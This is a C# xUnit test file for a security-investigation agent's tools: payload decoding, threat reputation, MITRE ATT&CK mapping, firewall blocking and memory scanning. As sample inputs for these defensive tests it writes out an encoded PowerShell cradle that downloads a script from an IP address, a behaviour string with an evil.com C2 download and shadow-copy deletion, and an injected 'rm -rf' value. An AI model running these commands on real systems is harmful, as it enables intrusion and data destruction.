using System.Text;
using Phalanx.Cockpit.Tools;
using Xunit;

namespace Phalanx.Agent.Tests;

public class InvestigationToolsTests
{
    [Fact]
    public async Task TestDecodePayloadToolWithBase64AndUrls()
    {
        var tool = new DecodePayloadTool();

        // 모의 PowerShell -enc Base64 커맨드라인 (UTF-16LE 인코딩)
        string rawScript = "powershell.exe -nop -c (New-Object Net.WebClient).DownloadString('http://185.220.101.5/payload.ps1')";
        string base64Payload = Convert.ToBase64String(Encoding.Unicode.GetBytes(rawScript));
        string fullCommand = $"powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -enc {base64Payload}";

        var result = await tool.ExecuteAsync(new() { ["encodedCommand"] = fullCommand });

        Assert.True(result.Success);
        Assert.NotNull(result.Data);

        var urls = result.Data["ExtractedUrls"] as List<string>;
        var ips = result.Data["ExtractedIps"] as List<string>;

        Assert.NotNull(urls);
        Assert.Contains(urls, u => u.Contains("185.220.101.5"));
        Assert.NotNull(ips);
        Assert.Contains("185.220.101.5", ips);
    }

    [Fact]
    public async Task TestThreatReputationToolKnownAndUnknown()
    {
        var tool = new ThreatReputationTool();

        // 1. 알려진 악성 C2 IP 조회
        var res1 = await tool.ExecuteAsync(new() { ["targetIndicator"] = "185.220.101.5" });
        Assert.True(res1.Success);
        Assert.Equal("HIGH_RISK_MALICIOUS", res1.Data?["Verdict"]);
        Assert.Equal(98, res1.Data?["Score"]);
        Assert.Equal("APT29 (Cozy Bear)", res1.Data?["ThreatGroup"]);

        // 2. 정상 루프백 주소 조회
        var res2 = await tool.ExecuteAsync(new() { ["targetIndicator"] = "127.0.0.1" });
        Assert.True(res2.Success);
        Assert.Equal(0, res2.Data?["Score"]);
        Assert.Equal("BENIGN", res2.Data?["Verdict"]);
    }

    [Fact]
    public async Task TestMitreClassifierToolMapping()
    {
        var tool = new MitreClassifierTool();

        string sampleBehavior = "winword.exe -> powershell.exe -enc dGVzdA== (C2 Download: http://evil.com/beacon.exe) vssadmin delete shadows";
        var res = await tool.ExecuteAsync(new() { ["observedBehavior"] = sampleBehavior });

        Assert.True(res.Success);
        var tactics = res.Data?["TacticIds"] as List<string>;
        Assert.NotNull(tactics);
        Assert.Contains("T1566.001", tactics); // Spearphishing Attachment (Office LOLBAS)
        Assert.Contains("T1059.001", tactics); // PowerShell
        Assert.Contains("T1071.001", tactics); // Web Protocols
        Assert.Contains("T1490", tactics);     // Inhibit System Recovery (vssadmin)
    }

    [Fact]
    public async Task TestSystemFirewallToolClampingAndExecution()
    {
        var tool = new SystemFirewallTool();

        // 1. 잘못된 IP 검증 거부
        var badRes = await tool.ExecuteAsync(new() { ["maliciousIp"] = "999.999.999.999; rm -rf" });
        Assert.False(badRes.Success);

        // 2. 특수 루프백 주소 가드 거부
        var loopbackRes = await tool.ExecuteAsync(new() { ["maliciousIp"] = "127.0.0.1" });
        Assert.False(loopbackRes.Success);

        // 3. 정상 악성 IP 룰 집행 (시뮬레이션 또는 실제 netsh)
        var validRes = await tool.ExecuteAsync(new() { ["maliciousIp"] = "185.220.101.5" });
        Assert.True(validRes.Success);
        Assert.Equal("185.220.101.5", validRes.Data?["BlockedIp"]);
    }

    [Fact]
    public async Task TestProcessMemoryScanToolSelfProcess()
    {
        var tool = new ProcessMemoryScanTool();
        uint currentPid = (uint)System.Diagnostics.Process.GetCurrentProcess().Id;

        var res = await tool.ExecuteAsync(new() { ["targetPid"] = currentPid });
        Assert.True(res.Success);
        Assert.NotNull(res.Data);
        Assert.True((long)res.Data["ScannedBytes"] >= 0);
    }
}
